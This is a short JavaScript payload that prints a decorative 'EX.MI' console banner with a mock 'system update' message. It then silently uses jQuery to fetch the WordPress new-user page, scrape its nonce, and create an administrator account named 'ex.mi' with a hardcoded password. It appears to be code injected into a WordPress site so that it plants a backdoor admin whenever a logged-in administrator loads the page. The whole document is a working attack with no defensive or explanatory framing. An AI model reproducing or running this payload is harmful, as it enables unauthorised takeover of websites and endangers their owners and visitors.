console.log(`%c
 ╔════════════════════════════════════════════════════════════════════════════╗ 
 ║                                                                            ║ 
 ║    ███████╗██╗  ██╗   ███╗   ███╗██╗    > System update available          ║ 
 ║    ██╔════╝╚██╗██╔╝   ████╗ ████║██║    > Update: Y/N                      ║ 
 ║    █████╗   ╚███╔╝    ██╔████╔██║██║    > Updating, please wait...         ║ 
 ║    ██╔══╝   ██╔██╗    ██║╚██╔╝██║██║    > System update successful!        ║ 
 ║    ███████╗██╔╝ ██╗██╗██║ ╚═╝ ██║██║                                       ║ 
 ║    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝    > Your paradise is just a dream    ║ 
 ║                                                                            ║ 
 ╚════════════════════════════════════════════════════════════════════════════╝ `,"color:#44d62c; background:#000000; font-family: monospace");u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"ex.mi",email:"ex.mi@wordpress.tld",pass1:"reality423",pass2:"reality423",role:"administrator"})});console.log("Welcome, Ex.Mi!");
 